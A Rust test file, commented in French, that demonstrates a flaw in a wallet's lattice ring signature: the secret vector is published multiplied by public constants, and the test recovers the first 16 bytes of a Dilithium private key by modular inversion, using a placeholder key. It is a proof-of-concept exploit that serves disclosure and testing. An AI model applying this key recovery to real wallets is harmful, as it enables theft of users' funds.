// tests/pq_ring_signature_key_leak.rs
//
// Démonstration de la fuite de clé privée Dilithium
// via la "PQLatticeRingSignature" cassée.
//
// Cette faille permet à n'importe qui de récupérer les 16 premiers octets
// de la clé privée maîtresse à partir d'une seule transaction on-chain.

const LATTICE_Q: u32 = 8380417;
const LATTICE_DIM: usize = 4;

/// Calcule l'inverse modulaire (Extended Euclidean Algorithm)
fn mod_inverse(a: u32, m: u32) -> Option<u32> {
    let mut t = 0i64;
    let mut new_t = 1i64;
    let mut r = m as i64;
    let mut new_r = a as i64;

    while new_r != 0 {
        let quotient = r / new_r;
        (t, new_t) = (new_t, t - quotient * new_t);
        (r, new_r) = (new_r, r - quotient * new_r);
    }

    if r > 1 {
        return None; // Pas d'inverse
    }
    if t < 0 {
        t += m as i64;
    }
    Some(t as u32)
}

#[test]
fn test_pq_ring_signature_leaks_dilithium_private_key() {
    // === Simulation d'une clé Dilithium (les 16 premiers octets) ===
    // En vrai, ça vient de sk_bytes_dil dans le wallet
    let secret_bytes: [u8; 16] = [
        0x12, 0x34, 0x56, 0x78,
        0x9a, 0xbc, 0xde, 0xf0,
        0x11, 0x22, 0x33, 0x44,
        0x55, 0x66, 0x77, 0x88,
    ];

    // === Ce que fait le wallet (code actuel) ===
    let mut s_vector = [0u32; LATTICE_DIM];
    for j in 0..LATTICE_DIM {
        let offset = j * 4;
        let bytes: [u8; 4] = secret_bytes[offset..offset + 4].try_into().unwrap();
        s_vector[j] = u32::from_le_bytes(bytes) % LATTICE_Q;
    }

    // Calcul de my_p (ce qui est envoyé en clair dans p_keys)
    let mut my_p = [0u32; LATTICE_DIM];
    let mut g_values = [0u32; LATTICE_DIM];

    for j in 0..LATTICE_DIM {
        let g_j = ((j as u32 + 1) * 1337) % LATTICE_Q;
        g_values[j] = g_j;
        my_p[j] = ((s_vector[j] as u64 * g_j as u64) % LATTICE_Q as u64) as u32;
    }

    // === Ce que peut faire n'importe quel attaquant ===
    // Il récupère my_p (p_keys) + g_j (public) depuis la blockchain
    let mut recovered_s = [0u32; LATTICE_DIM];

    for j in 0..LATTICE_DIM {
        let g_inv = mod_inverse(g_values[j], LATTICE_Q)
            .expect("g_j devrait être inversible");
        recovered_s[j] =
            ((my_p[j] as u64 * g_inv as u64) % LATTICE_Q as u64) as u32;
    }

    // === Preuve de la fuite ===
    assert_eq!(
        s_vector, recovered_s,
        "FAILLE CRITIQUE : La clé privée Dilithium a été reconstituée à partir des données publiques !"
    );

    println!("🚨 DÉMONSTRATION RÉUSSIE : La clé privée a fuité.");
    println!("   s_vector original : {:?}", s_vector);
    println!("   s_vector récupéré : {:?}", recovered_s);
}